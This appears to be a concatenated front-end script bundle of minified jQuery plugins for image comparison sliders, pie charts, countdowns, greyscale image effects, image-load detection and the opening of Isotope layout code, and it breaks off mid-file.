/**
 * Before After
 * 
 * TwentyTwenty
 * 
 * http://zurb.com/playground/twentytwenty
 */
! function(t) {
	t.fn.twentytwenty = function(e) {
		var e = t.extend({
			default_offset_pct: .5,
			orientation: "horizontal"
		}, e);
		return this.each(function() {
			var n = e.default_offset_pct,
				i = t(this),
				a = e.orientation,
				s = "vertical" === a ? "down" : "left",
				d = "vertical" === a ? "up" : "right";
			i.wrap("<div class='twentytwenty-wrapper twentytwenty-" + a + "'></div>"), i.append("<div class='twentytwenty-overlay'></div>");
			var r = i.find("img:first"),
				w = i.find("img:last");
			i.append("<div class='twentytwenty-handle'></div>");
			var c = i.find(".twentytwenty-handle");
			c.append("<span class='twentytwenty-" + s + "-arrow'></span>"), c.append("<span class='twentytwenty-" + d + "-arrow'></span>"), i.addClass("twentytwenty-container"), r.addClass("twentytwenty-before"), w.addClass("twentytwenty-after");
			var o = i.find(".twentytwenty-overlay");
			o.append("<div class='twentytwenty-before-label'></div>"), o.append("<div class='twentytwenty-after-label'></div>");
			var f = function(t) {
					var e = r.width(),
						n = r.height();
					return {
						w: e + "px",
						h: n + "px",
						cw: t * e + "px",
						ch: t * n + "px"
					}
				},
				l = function(t) {
					"vertical" === a ? r.css("clip", "rect(0," + t.w + "," + t.ch + ",0)") : r.css("clip", "rect(0," + t.cw + "," + t.h + ",0)"), i.css("height", t.h)
				},
				v = function(t) {
					var e = f(t);
					c.css("vertical" === a ? "top" : "left", "vertical" === a ? e.ch : e.cw), l(e)
				};
			t(window).on("resize.twentytwenty", function(t) {
				v(n)
			});
			var p = 0,
				y = 0;
			c.on("movestart", function(t) {
				(t.distX > t.distY && t.distX < -t.distY || t.distX < t.distY && t.distX > -t.distY) && "vertical" !== a ? t.preventDefault() : (t.distX < t.distY && t.distX < -t.distY || t.distX > t.distY && t.distX > -t.distY) && "vertical" === a && t.preventDefault(), i.addClass("active"), p = i.offset().left, offsetY = i.offset().top, y = r.width(), imgHeight = r.height()
			}), c.on("moveend", function(t) {
				i.removeClass("active")
			}), c.on("move", function(t) {
				i.hasClass("active") && (n = "vertical" === a ? (t.pageY - offsetY) / imgHeight : (t.pageX - p) / y, 0 > n && (n = 0), n > 1 && (n = 1), v(n))
			}), i.find("img").on("mousedown", function(t) {
				t.preventDefault()
			}), t(window).trigger("resize.twentytwenty")
		})
	}
}(jQuery);


/**
 * Event Move 
 * required for: TwentyTwenty
 * 
 * 1.3.6 | Stephen Band
 */
! function(t) {
	"function" == typeof define && define.amd ? define(["jquery"], t) : t(jQuery)
}(function(t, e) {
	function n(t) {
		function e(t) {
			a ? (n(), O(e), i = !0, a = !1) : i = !1
		}
		var n = t,
			a = !1,
			i = !1;
		this.kick = function(t) {
			a = !0, i || e()
		}, this.end = function(t) {
			var e = n;
			t && (i ? (n = a ? function() {
				e(), t()
			} : t, a = !0) : t())
		}
	}

	function a() {
		return !0
	}

	function i() {
		return !1
	}

	function o(t) {
		t.preventDefault()
	}

	function r(t) {
		z[t.target.tagName.toLowerCase()] || t.preventDefault()
	}

	function u(t) {
		return 1 === t.which && !t.ctrlKey && !t.altKey
	}

	function c(t, e) {
		var n, a;
		if (t.identifiedTouch) return t.identifiedTouch(e);
		for (n = -1, a = t.length; ++n < a;)
			if (t[n].identifier === e) return t[n]
	}

	function d(t, e) {
		var n = c(t.changedTouches, e.identifier);
		if (n && (n.pageX !== e.pageX || n.pageY !== e.pageY)) return n
	}

	function m(t) {
		var e;
		u(t) && (e = {
			target: t.target,
			startX: t.pageX,
			startY: t.pageY,
			timeStamp: t.timeStamp
		}, K(document, Q.move, f, e), K(document, Q.cancel, s, e))
	}

	function f(t) {
		var e = t.data;
		X(t, e, t, v)
	}

	function s(t) {
		v()
	}

	function v() {
		L(document, Q.move, f), L(document, Q.cancel, s)
	}

	function p(t) {
		var e, n;
		z[t.target.tagName.toLowerCase()] || (e = t.changedTouches[0], n = {
			target: e.target,
			startX: e.pageX,
			startY: e.pageY,
			timeStamp: t.timeStamp,
			identifier: e.identifier
		}, K(document, B.move + "." + e.identifier, g, n), K(document, B.cancel + "." + e.identifier, h, n))
	}

	function g(t) {
		var e = t.data,
			n = d(t, e);
		n && X(t, e, n, l)
	}

	function h(t) {
		var e = t.data,
			n = c(t.changedTouches, e.identifier);
		n && l(e.identifier)
	}

	function l(t) {
		L(document, "." + t, g), L(document, "." + t, h)
	}

	function X(t, e, n, a) {
		var i = n.pageX - e.startX,
			o = n.pageY - e.startY;
		C * C > i * i + o * o || y(t, e, n, i, o, a)
	}

	function Y() {
		return this._handled = a, !1
	}

	function w(t) {
		t._handled()
	}

	function y(t, e, n, a, i, o) {
		var r, u;
		e.target;
		r = t.targetTouches, u = t.timeStamp - e.timeStamp, e.type = "movestart", e.distX = a, e.distY = i, e.deltaX = a, e.deltaY = i, e.pageX = n.pageX, e.pageY = n.pageY, e.velocityX = a / u, e.velocityY = i / u, e.targetTouches = r, e.finger = r ? r.length : 1, e._handled = Y, e._preventTouchmoveDefault = function() {
			t.preventDefault()
		}, N(e.target, e), o(e.identifier)
	}

	function T(t) {
		var e = t.data.timer;
		t.data.touch = t, t.data.timeStamp = t.timeStamp, e.kick()
	}

	function S(t) {
		var e = t.data.event,
			n = t.data.timer;
		k(), F(e, n, function() {
			setTimeout(function() {
				L(e.target, "click", i)
			}, 0)
		})
	}

	function k(t) {
		L(document, Q.move, T), L(document, Q.end, S)
	}

	function _(t) {
		var e = t.data.event,
			n = t.data.timer,
			a = d(t, e);
		a && (t.preventDefault(), e.targetTouches = t.targetTouches, t.data.touch = a, t.data.timeStamp = t.timeStamp, n.kick())
	}

	function q(t) {
		var e = t.data.event,
			n = t.data.timer,
			a = c(t.changedTouches, e.identifier);
		a && (A(e), F(e, n))
	}

	function A(t) {
		L(document, "." + t.identifier, _), L(document, "." + t.identifier, q)
	}

	function D(t, e, n, a) {
		var i = n - t.timeStamp;
		t.type = "move", t.distX = e.pageX - t.startX, t.distY = e.pageY - t.startY, t.deltaX = e.pageX - t.pageX, t.deltaY = e.pageY - t.pageY, t.velocityX = .3 * t.velocityX + .7 * t.deltaX / i, t.velocityY = .3 * t.velocityY + .7 * t.deltaY / i, t.pageX = e.pageX, t.pageY = e.pageY
	}

	function F(t, e, n) {
		e.end(function() {
			return t.type = "moveend", N(t.target, t), n && n()
		})
	}

	function R(t, e, n) {
		return K(this, "movestart.move", w), !0
	}

	function x(t) {
		return L(this, "dragstart drag", o), L(this, "mousedown touchstart", r), L(this, "movestart", w), !0
	}

	function b(t) {
		"move" !== t.namespace && "moveend" !== t.namespace && (K(this, "dragstart." + t.guid + " drag." + t.guid, o, e, t.selector), K(this, "mousedown." + t.guid, r, e, t.selector))
	}

	function j(t) {
		"move" !== t.namespace && "moveend" !== t.namespace && (L(this, "dragstart." + t.guid + " drag." + t.guid), L(this, "mousedown." + t.guid))
	}
	var C = 6,
		K = t.event.add,
		L = t.event.remove,
		N = function(e, n, a) {
			t.event.trigger(n, a, e)
		},
		O = function() {
			return window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame || function(t, e) {
				return window.setTimeout(function() {
					t()
				}, 25)
			}
		}(),
		z = {
			textarea: !0,
			input: !0,
			select: !0,
			button: !0
		},
		Q = {
			move: "mousemove",
			cancel: "mouseup dragstart",
			end: "mouseup"
		},
		B = {
			move: "touchmove",
			cancel: "touchend",
			end: "touchend"
		};
	t.event.special.movestart = {
		setup: R,
		teardown: x,
		add: b,
		remove: j,
		_default: function(t) {
			function a(e) {
				D(o, r.touch, r.timeStamp), N(t.target, o)
			}
			var o, r;
			t._handled() && (o = {
				target: t.target,
				startX: t.startX,
				startY: t.startY,
				pageX: t.pageX,
				pageY: t.pageY,
				distX: t.distX,
				distY: t.distY,
				deltaX: t.deltaX,
				deltaY: t.deltaY,
				velocityX: t.velocityX,
				velocityY: t.velocityY,
				timeStamp: t.timeStamp,
				identifier: t.identifier,
				targetTouches: t.targetTouches,
				finger: t.finger
			}, r = {
				event: o,
				timer: new n(a),
				touch: e,
				timeStamp: e
			}, t.identifier === e ? (K(t.target, "click", i), K(document, Q.move, T, r), K(document, Q.end, S, r)) : (t._preventTouchmoveDefault(), K(document, B.move + "." + t.identifier, _, r), K(document, B.end + "." + t.identifier, q, r)))
		}
	}, t.event.special.move = {
		setup: function() {
			K(this, "movestart.move", t.noop)
		},
		teardown: function() {
			L(this, "movestart.move", t.noop)
		}
	}, t.event.special.moveend = {
		setup: function() {
			K(this, "movestart.moveend", t.noop)
		},
		teardown: function() {
			L(this, "movestart.moveend", t.noop)
		}
	}, K(document, "mousedown.move", m), K(document, "touchstart.move", p), "function" == typeof Array.prototype.indexOf && ! function(t, e) {
		for (var n = ["changedTouches", "targetTouches"], a = n.length; a--;) - 1 === t.event.props.indexOf(n[a]) && t.event.props.push(n[a])
	}(t)
});


/**
 * Chart 
 * 
 * easyPieChart
 * 
 * 2.1.3 | Robert Fleischmann <rendro87@gmail.com> (http://robert-fleischmann.de)
 **/
! function(a, b) {
	"object" == typeof exports ? module.exports = b(require("jquery")) : "function" == typeof define && define.amd ? define("EasyPieChart", ["jquery"], b) : b(a.jQuery)
}(this, function(a) {
	var b = function(a, b) {
			var c, d = document.createElement("canvas");
			"undefined" != typeof G_vmlCanvasManager && G_vmlCanvasManager.initElement(d);
			var e = d.getContext("2d");
			d.width = d.height = b.size, a.appendChild(d);
			var f = 1;
			window.devicePixelRatio > 1 && (f = window.devicePixelRatio, d.style.width = d.style.height = [b.size, "px"].join(""), d.width = d.height = b.size * f, e.scale(f, f)), e.translate(b.size / 2, b.size / 2), e.rotate((-0.5 + b.rotate / 180) * Math.PI);
			var g = (b.size - b.lineWidth) / 2;
			b.scaleColor && b.scaleLength && (g -= b.scaleLength + 2), Date.now = Date.now || function() {
				return +new Date
			};
			var h = function(a, b, c) {
					c = Math.min(Math.max(-1, c || 0), 1);
					var d = 0 >= c ? !0 : !1;
					e.beginPath(), e.arc(0, 0, g, 0, 2 * Math.PI * c, d), e.strokeStyle = a, e.lineWidth = b, e.stroke()
				},
				i = function() {
					var a, c, d = 24;
					e.lineWidth = 1, e.fillStyle = b.scaleColor, e.save();
					for (var d = 24; d > 0; --d) 0 === d % 6 ? (c = b.scaleLength, a = 0) : (c = .6 * b.scaleLength, a = b.scaleLength - c), e.fillRect(-b.size / 2 + a, 0, c, 1), e.rotate(Math.PI / 12);
					e.restore()
				},
				j = function() {
					return window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || function(a) {
						window.setTimeout(a, 1e3 / 60)
					}
				}(),
				k = function() {
					b.scaleColor && i(), b.trackColor && h(b.trackColor, b.lineWidth, 1)
				};
			this.clear = function() {
				e.clearRect(b.size / -2, b.size / -2, b.size, b.size)
			}, this.draw = function(a) {
				b.scaleColor || b.trackColor ? e.getImageData && e.putImageData ? c ? e.putImageData(c, 0, 0) : (k(), c = e.getImageData(0, 0, b.size * f, b.size * f)) : (this.clear(), k()) : this.clear(), e.lineCap = b.lineCap;
				var d;
				d = "function" == typeof b.barColor ? b.barColor(a) : b.barColor, h(d, b.lineWidth, a / 100)
			}.bind(this), this.animate = function(a, c) {
				var d = Date.now();
				b.onStart(a, c);
				var e = function() {
					var f = Math.min(Date.now() - d, b.animate),
						g = b.easing(this, f, a, c - a, b.animate);
					this.draw(g), b.onStep(a, c, g), f >= b.animate ? b.onStop(a, c) : j(e)
				}.bind(this);
				j(e)
			}.bind(this)
		},
		c = function(a, c) {
			var d = {
				barColor: "#ef1e25",
				trackColor: "#f9f9f9",
				scaleColor: "#dfe0e0",
				scaleLength: 5,
				lineCap: "round",
				lineWidth: 3,
				size: 110,
				rotate: 0,
				animate: 1e3,
				easing: function(a, b, c, d, e) {
					return b /= e / 2, 1 > b ? d / 2 * b * b + c : -d / 2 * (--b * (b - 2) - 1) + c
				},
				onStart: function() {},
				onStep: function() {},
				onStop: function() {}
			};
			if ("undefined" != typeof b) d.renderer = b;
			else {
				if ("undefined" == typeof SVGRenderer) throw new Error("Please load either the SVG- or the CanvasRenderer");
				d.renderer = SVGRenderer
			}
			var e = {},
				f = 0,
				g = function() {
					this.el = a, this.options = e;
					for (var b in d) d.hasOwnProperty(b) && (e[b] = c && "undefined" != typeof c[b] ? c[b] : d[b], "function" == typeof e[b] && (e[b] = e[b].bind(this)));
					e.easing = "string" == typeof e.easing && "undefined" != typeof jQuery && jQuery.isFunction(jQuery.easing[e.easing]) ? jQuery.easing[e.easing] : d.easing, this.renderer = new e.renderer(a, e), this.renderer.draw(f), a.dataset && a.dataset.percent ? this.update(parseFloat(a.dataset.percent)) : a.getAttribute && a.getAttribute("data-percent") && this.update(parseFloat(a.getAttribute("data-percent")))
				}.bind(this);
			this.update = function(a) {
				return a = parseFloat(a), e.animate ? this.renderer.animate(f, a) : this.renderer.draw(a), f = a, this
			}.bind(this), g()
		};
	a.fn.easyPieChart = function(b) {
		return this.each(function() {
			var d;
			a.data(this, "easyPieChart") || (d = a.extend({}, b, a(this).data()), a.data(this, "easyPieChart", new c(this, d)))
		})
	}
});


/**
 * Countdown
 * 
 * downCount
 * 
 * Sonny T. <hi@sonnyt.com>, sonnyt.com
 */
(function(e) {
	e.fn.downCount = function(t, n) {
		function o() {
			var e = new Date(r.date),
				t = s();
			var o = e - t;
			if (o < 0) {
				clearInterval(u);
				if (n && typeof n === "function") n();
				return
			}
			var a = 1e3,
				f = a * 60,
				l = f * 60,
				c = l * 24;
			var h = Math.floor(o / c),
				p = Math.floor(o % c / l),
				d = Math.floor(o % l / f),
				v = Math.floor(o % f / a);
			h = String(h).length >= 2 ? h : "0" + h;
			p = String(p).length >= 2 ? p : "0" + p;
			d = String(d).length >= 2 ? d : "0" + d;
			v = String(v).length >= 2 ? v : "0" + v;
			var m = h === 1 ? "day" : "days",
				g = p === 1 ? "hour" : "hours",
				y = d === 1 ? "minute" : "minutes",
				b = v === 1 ? "second" : "seconds";
			i.find(".days").text(h);
			i.find(".hours").text(p);
			i.find(".minutes").text(d);
			i.find(".seconds").text(v);
			i.find(".days_ref").text(m);
			i.find(".hours_ref").text(g);
			i.find(".minutes_ref").text(y);
			i.find(".seconds_ref").text(b)
		}
		var r = e.extend({
			date: null,
			offset: null
		}, t);
		if (!r.date) {
			e.error("Date is not defined.")
		}
		if (!Date.parse(r.date)) {
			e.error("Incorrect date format, it should look like this, 12/24/2012 12:00:00.")
		}
		var i = this;
		var s = function() {
			var e = new Date;
			var t = e.getTime() + e.getTimezoneOffset() * 6e4;
			var n = new Date(t + 36e5 * r.offset);
			return n
		};
		var u = setInterval(o, 1e3)
	}
})(jQuery);


/**
 * Greyscale
 * 
 * Black & White
 * 
 * 0.3.7 |  Gianluca Guarini | http://www.gianlucaguarini.com/
 **/
! function(a) {
	a.fn.extend({
		BlackAndWhite: function(b) {
			"use strict";
			var c = this,
				d = a.extend({
					hoverEffect: !0,
					webworkerPath: !1,
					invertHoverEffect: !1,
					speed: 500,
					onImageReady: null,
					intensity: 1
				}, b),
				e = d.hoverEffect,
				f = d.webworkerPath,
				g = d.invertHoverEffect,
				h = "number" == typeof d.intensity && d.intensity < 1 && d.intensity > 0 ? d.intensity : 1,
				i = a.isPlainObject(d.speed) ? d.speed.fadeIn : d.speed,
				j = a.isPlainObject(d.speed) ? d.speed.fadeOut : d.speed,
				k = a(window),
				l = ".BlackAndWhite",
				m = (document.all && !window.opera && window.XMLHttpRequest ? !0 : !1, " -webkit- -moz- -o- -ms- ".split(" ")),
				n = {},
				o = function(a) {
					if (n[a] || "" === n[a]) return n[a] + a;
					var b = document.createElement("div"),
						c = ["", "Moz", "Webkit", "O", "ms", "Khtml"];
					for (var d in c)
						if ("undefined" != typeof b.style[c[d] + a]) return n[a] = c[d], c[d] + a;
					return a.toLowerCase()
				},
				p = function() {
					var a = document.createElement("div");
					return a.style.cssText = m.join("filter:blur(2px); "), !!a.style.length && (void 0 === document.documentMode || document.documentMode > 9)
				}(),
				q = !!document.createElement("canvas").getContext,
				r = function() {
					return "undefined" != typeof Worker ? !0 : !1
				}(),
				s = o("Filter"),
				t = [],
				u = r && f ? new Worker(f + "BnWWorker.js") : !1,
				v = function(b) {
					a(b.currentTarget).find(".BWfade").stop(!0, !0).animate({
						opacity: g ? 0 : 1
					}, j)
				},
				w = function(b) {
					a(b.currentTarget).find(".BWfade").stop(!0, !0).animate({
						opacity: g ? 1 : 0
					}, i)
				},
				x = function(a) {
					"function" == typeof d.onImageReady && d.onImageReady(a)
				},
				y = function(a) {
					u && q && !p && !a && z()
				},
				z = function() {
					return t.length ? (u.postMessage({
						imgData: t[0].imageData,
						intensity: h
					}), void(u.onmessage = function(a) {
						t[0].ctx.putImageData(a.data, 0, 0), x(t[0].img), t.splice(0, 1), z()
					})) : (u.terminate && u.terminate(), void(u.close && u.close()))
				},
				A = function(a) {
					return a.complete || "undefined" != typeof a.naturalWidth && a.naturalWidth
				},
				B = function(a, b, c, d) {
					var e = b.getContext("2d"),
						f = 0;
					e.drawImage(a, 0, 0, c, d);
					var g = e.getImageData(0, 0, c, d),
						i = g.data,
						j = i.length;
					if (u) t.push({
						imageData: g,
						ctx: e,
						img: a
					});
					else {
						for (; j > f; f += 4) {
							var k = .3 * i[f] + .59 * i[f + 1] + .11 * i[f + 2];
							i[f] = ~~(k * h + i[f] * (1 - h)), i[f + 1] = ~~(k * h + i[f + 1] * (1 - h)), i[f + 2] = ~~(k * h + i[f + 2] * (1 - h))
						}
						e.putImageData(g, 0, 0), x(a)
					}
				},
				C = function(b, c) {
					var d, e = b[0],
						f = (e.src, b.position()),
						i = {
							top: f.top,
							left: f.left,
							position: "absolute",
							"-webkit-transform": "translate3d(0,0,0)",
							opacity: g ? 0 : 1
						};
					e.crossOrigin = "anonymous", q && !p ? (d = a('<canvas width="' + e.naturalWidth + '" height="' + e.naturalHeight + '" class="BWfade"></canvas>'), i.width = b.width(), i.height = b.height(), B(e, d.get(0), e.naturalWidth, e.naturalHeight)) : (q ? i[s] = "grayscale(" + 100 * h + "%)" : i.filter = "progid:DXImageTransform.Microsoft.BasicImage(grayscale=1)", d = b.clone().addClass("BWFilter BWfade"), x(e)), d.css(i).prependTo(c), !a.support.opacity && g && d.animate({
						opacity: 0
					}, 0)
				},
				D = function() {
					c.each(function(b, c) {
						var d = a(c).find("img"),
							e = a(d).width(),
							f = a(d).height();
						a(this).find("canvas").css({
							width: e,
							height: f
						})
					})
				},
				E = function() {
					var b = c.find("img").filter(function() {
						return !a(this).data("_b&w")
					}).length;
					c.each(function(c, d) {
						var e = a(d),
							f = e.find("img");
						f.data("_b&w") || (A(f[0]) ? (b--, C(f, e)) : f.on("load", function() {
							return f.data("_b&w_loaded") || !f[0].complete ? void setTimeout(function() {
								f.load()
							}, 20) : (C(f, e), f.data("_b&w_loaded", !0), b--, void y(b))
						}).load(), f.data("_b&w", !0))
					}), y(b), e && c.unbind(l).on("mouseleave" + l, v).on("mouseenter" + l, w), q && !p && k.unbind(l).on("resize" + l + " orientationchange" + l, D)
				},
				F = function() {
					c.off(l), k.off(l)
				};
			return E(), {
				destroy: F
			}
		}
	})
}(jQuery);


/**
 * imagesLoaded
 * required for: Isotope
 * 
 * 4.1.0 | http://imagesloaded.desandro.com/
 */
(function(t, e) {
	"function" == typeof define && define.amd ? define("ev-emitter/ev-emitter", e) : "object" == typeof module && module.exports ? module.exports = e() : t.EvEmitter = e()
}(this, function() {
	function t() {}
	var e = t.prototype;
	return e.on = function(t, e) {
		if (t && e) {
			var i = this._events = this._events || {},
				n = i[t] = i[t] || [];
			return -1 == n.indexOf(e) && n.push(e), this
		}
	}, e.once = function(t, e) {
		if (t && e) {
			this.on(t, e);
			var i = this._onceEvents = this._onceEvents || {},
				n = i[t] = i[t] || [];
			return n[e] = !0, this
		}
	}, e.off = function(t, e) {
		var i = this._events && this._events[t];
		if (i && i.length) {
			var n = i.indexOf(e);
			return -1 != n && i.splice(n, 1), this
		}
	}, e.emitEvent = function(t, e) {
		var i = this._events && this._events[t];
		if (i && i.length) {
			var n = 0,
				o = i[n];
			e = e || [];
			for (var r = this._onceEvents && this._onceEvents[t]; o;) {
				var s = r && r[o];
				s && (this.off(t, o), delete r[o]), o.apply(this, e), n += s ? 0 : 1, o = i[n]
			}
			return this
		}
	}, t
}), function(t, e) {
	"use strict";
	"function" == typeof define && define.amd ? define(["ev-emitter/ev-emitter"], function(i) {
		return e(t, i)
	}) : "object" == typeof module && module.exports ? module.exports = e(t, require("ev-emitter")) : t.imagesLoaded = e(t, t.EvEmitter)
}(window, function(t, e) {
	function i(t, e) {
		for (var i in e) t[i] = e[i];
		return t
	}

	function n(t) {
		var e = [];
		if (Array.isArray(t)) e = t;
		else if ("number" == typeof t.length)
			for (var i = 0; i < t.length; i++) e.push(t[i]);
		else e.push(t);
		return e
	}

	function o(t, e, r) {
		return this instanceof o ? ("string" == typeof t && (t = document.querySelectorAll(t)), this.elements = n(t), this.options = i({}, this.options), "function" == typeof e ? r = e : i(this.options, e), r && this.on("always", r), this.getImages(), h && (this.jqDeferred = new h.Deferred), void setTimeout(function() {
			this.check()
		}.bind(this))) : new o(t, e, r)
	}

	function r(t) {
		this.img = t
	}

	function s(t, e) {
		this.url = t, this.element = e, this.img = new Image
	}
	var h = t.jQuery,
		a = t.console;
	o.prototype = Object.create(e.prototype), o.prototype.options = {}, o.prototype.getImages = function() {
		this.images = [], this.elements.forEach(this.addElementImages, this)
	}, o.prototype.addElementImages = function(t) {
		"IMG" == t.nodeName && this.addImage(t), this.options.background === !0 && this.addElementBackgroundImages(t);
		var e = t.nodeType;
		if (e && d[e]) {
			for (var i = t.querySelectorAll("img"), n = 0; n < i.length; n++) {
				var o = i[n];
				this.addImage(o)
			}
			if ("string" == typeof this.options.background) {
				var r = t.querySelectorAll(this.options.background);
				for (n = 0; n < r.length; n++) {
					var s = r[n];
					this.addElementBackgroundImages(s)
				}
			}
		}
	};
	var d = {
		1: !0,
		9: !0,
		11: !0
	};
	return o.prototype.addElementBackgroundImages = function(t) {
		var e = getComputedStyle(t);
		if (e)
			for (var i = /url\((['"])?(.*?)\1\)/gi, n = i.exec(e.backgroundImage); null !== n;) {
				var o = n && n[2];
				o && this.addBackground(o, t), n = i.exec(e.backgroundImage)
			}
	}, o.prototype.addImage = function(t) {
		var e = new r(t);
		this.images.push(e)
	}, o.prototype.addBackground = function(t, e) {
		var i = new s(t, e);
		this.images.push(i)
	}, o.prototype.check = function() {
		function t(t, i, n) {
			setTimeout(function() {
				e.progress(t, i, n)
			})
		}
		var e = this;
		return this.progressedCount = 0, this.hasAnyBroken = !1, this.images.length ? void this.images.forEach(function(e) {
			e.once("progress", t), e.check()
		}) : void this.complete()
	}, o.prototype.progress = function(t, e, i) {
		this.progressedCount++, this.hasAnyBroken = this.hasAnyBroken || !t.isLoaded, this.emitEvent("progress", [this, t, e]), this.jqDeferred && this.jqDeferred.notify && this.jqDeferred.notify(this, t), this.progressedCount == this.images.length && this.complete(), this.options.debug && a && a.log("progress: " + i, t, e)
	}, o.prototype.complete = function() {
		var t = this.hasAnyBroken ? "fail" : "done";
		if (this.isComplete = !0, this.emitEvent(t, [this]), this.emitEvent("always", [this]), this.jqDeferred) {
			var e = this.hasAnyBroken ? "reject" : "resolve";
			this.jqDeferred[e](this)
		}
	}, r.prototype = Object.create(e.prototype), r.prototype.check = function() {
		var t = this.getIsImageComplete();
		return t ? void this.confirm(0 !== this.img.naturalWidth, "naturalWidth") : (this.proxyImage = new Image, this.proxyImage.addEventListener("load", this), this.proxyImage.addEventListener("error", this), this.img.addEventListener("load", this), this.img.addEventListener("error", this), void(this.proxyImage.src = this.img.src))
	}, r.prototype.getIsImageComplete = function() {
		return this.img.complete && void 0 !== this.img.naturalWidth
	}, r.prototype.confirm = function(t, e) {
		this.isLoaded = t, this.emitEvent("progress", [this, this.img, e])
	}, r.prototype.handleEvent = function(t) {
		var e = "on" + t.type;
		this[e] && this[e](t)
	}, r.prototype.onload = function() {
		this.confirm(!0, "onload"), this.unbindEvents()
	}, r.prototype.onerror = function() {
		this.confirm(!1, "onerror"), this.unbindEvents()
	}, r.prototype.unbindEvents = function() {
		this.proxyImage.removeEventListener("load", this), this.proxyImage.removeEventListener("error", this), this.img.removeEventListener("load", this), this.img.removeEventListener("error", this)
	}, s.prototype = Object.create(r.prototype), s.prototype.check = function() {
		this.img.addEventListener("load", this), this.img.addEventListener("error", this), this.img.src = this.url;
		var t = this.getIsImageComplete();
		t && (this.confirm(0 !== this.img.naturalWidth, "naturalWidth"), this.unbindEvents())
	}, s.prototype.unbindEvents = function() {
		this.img.removeEventListener("load", this), this.img.removeEventListener("error", this)
	}, s.prototype.confirm = function(t, e) {
		this.isLoaded = t, this.emitEvent("progress", [this, this.element, e])
	}, o.makeJQueryPlugin = function(e) {
		e = e || t.jQuery, e && (h = e, h.fn.imagesLoaded = function(t, e) {
			var i = new o(this, t, e);
			return i.jqDeferred.promise(h(this))
		})
	}, o.makeJQueryPlugin(), o
}));


/**
 * Isotope
 * 
 * 2.1.0 | http://isotope.metafizzy.co
 */
(function(t) {
	function e() {}

	function i(t) {
		function i(e) {
			e.prototype.option || (e.prototype.option = function(e) {
				t.isPlainObject(e) && (this.options = t.extend(!0, this.options, e))
			})
		}

		function n(e, i) {
			t.fn[e] = function(n) {
				if ("string" == typeof n) {
					for (var s = o.call(arguments, 1), a = 0, u = this.length; u > a; a++) {
						var p = this[a],
							h = t.data(p, e);
						if (h)
							if (t.isFunction(h[n]) && "_" !== n.charAt(0)) {
								var f = h[n].apply(h, s);
								if (void 0 !== f) return f
							} else r("no such method '" + n + "' for " + e + " instance");
						else r("cannot call methods on " + e + " prior to initialization; " + "attempted to call '" + n + "'")
					}
					return this
				}
				return this.each(function() {
					var o = t.data(this, e);
					o ? (o.option(n), o._init()) : (o = new i(this, n), t.data(this, e, o))
				})
			}
		}
		if (t) {
			var r = "undefined" == typeof console ? e : function(t) {
				console.error(t)
			};
			return t.bridget = function(t, e) {
				i(e), n(t, e)
			}, t.bridget
		}
	}
	var o = Array.prototype.slice;
	"function" == typeof define && define.amd ? define("jquery-bridget/jquery.bridget", ["jquery"], i) : "object" == typeof exports ? i(require("jquery")) : i(t.jQuery)
})(window),
function(t) {
	function e(e) {
		var i = t.event;
		return i.target = i.target || i.srcElement || e, i
	}
	var i = document.documentElement,
		o = function() {};
	i.addEventListener ? o = function(t, e, i) {
		t.addEventListener(e, i, !1)
	} : i.attachEvent && (o = function(t, i, o) {
		t[i + o] = o.handleEvent ? function() {
			var i = e(t);
			o.handleEvent.call(o, i)
		} : function() {
			var i = e(t);
			o.call(t, i)
		}, t.attachEvent("on" + i, t[i + o])
	});
	var n = function() {};
	i.removeEventListener ? n = function(t, e, i) {
		t.removeEventListener(e, i, !1)
	} : i.detachEvent && (n = function(t, e, i) {
		t.detachEvent("on" + e, t[e + i]);
		try {
			delete t[e + i]
		} catch (o) {
			t[e + i] = void 0
		}
	});
	var r = {
		bind: o,
		unbind: n
	};
	"function" == typeof define && define.amd ? define("eventie/eventie", r) : "object" == typeof exports ? module.exports = r : t.eventie = r
}(this),
function(t) {
	function e(t) {
		"function" == typeof t && (e.isReady ? t() : s.push(t))
	}

	function i(t) {
		var i = "readystatechange" === t.type && "complete" !== r.readyState;
		e.isReady || i || o()
	}

	function o() {
		e.isReady = !0;
		for (var t = 0, i = s.length; i > t; t++) {
			var o = s[t];
			o()
		}
	}

	function n(n) {
		return "complete" === r.readyState ? o() : (n.bind(r, "DOMContentLoaded", i), n.bind(r, "readystatechange", i), n.bind(t, "load", i)), e
	}
	var r = t.document,
		s = [];
	e.isReady = !1, "function" == typeof define && define.amd ? define("doc-ready/doc-ready", ["eventie/eventie"], n) : "object" == typeof exports ? module.exports = n(require("eventie")) : t.docReady = n(t.eventie)
}(window),
function() {
	function t() {}

	function e(t, e) {
		for (var i = t.length; i--;)
			if (t[i].listener === e) return i;
		return -1
	}

	function i(t) {
		return function() {
			return this[t].apply(this, arguments)
		}
	}
	var o = t.prototype,
		n = this,
		r = n.EventEmitter;
	o.getListeners = function(t) {
		var e, i, o = this._getEvents();
		if (t instanceof RegExp) {
			e = {};
			for (i in o) o.hasOwnProperty(i) && t.test(i) && (e[i] = o[i])
		} else e = o[t] || (o[t] = []);
		return e
	}, o.flattenListeners = function(t) {
		var e, i = [];
		for (e = 0; t.length > e; e += 1) i.push(t[e].listener);
		return i
	}, o.getListenersAsObject = function(t) {
		var e, i = this.getListeners(t);
		return i instanceof Array && (e = {}, e[t] = i), e || i
	}, o.addListener = function(t, i) {
		var o, n = this.getListenersAsObject(t),
			r = "object" == typeof i;
		for (o in n) n.hasOwnProperty(o) && -1 === e(n[o], i) && n[o].push(r ? i : {
			listener: i,
			once: !1
		});
		return this
	}, o.on = i("addListener"), o.addOnceListener = function(t, e) {
		return this.addListener(t, {
			listener: e,
			once: !0
		})
	}, o.once = i("addOnceListener"), o.defineEvent = function(t) {
		return this.getListeners(t), this
	}, o.defineEvents = function(t) {
		for (var e = 0; t.length > e; e += 1) this.defineEvent(t[e]);
		return this
	}, o.removeListener = function(t, i) {
		var o, n, r = this.getListenersAsObject(t);
		for (n in r) r.hasOwnProperty(n) && (o = e(r[n], i), -1 !== o && r[n].splice(o, 1));
		return this
	}, o.off = i("removeListener"), o.addListeners = function(t, e) {
		return this.manipulateListeners(!1, t, e)
	}, o.removeListeners = function(t, e) {
		return this.manipulateListeners(!0, t, e)
	}, o.manipulateListeners = function(t, e, i) {
		var o, n, r = t ? this.removeListener : this.addListener,
			s = t ? this.removeListeners : this.addListeners;
		if ("object" != typeof e || e instanceof RegExp)
			for (o = i.length; o--;) r.call(this, e, i[o]);
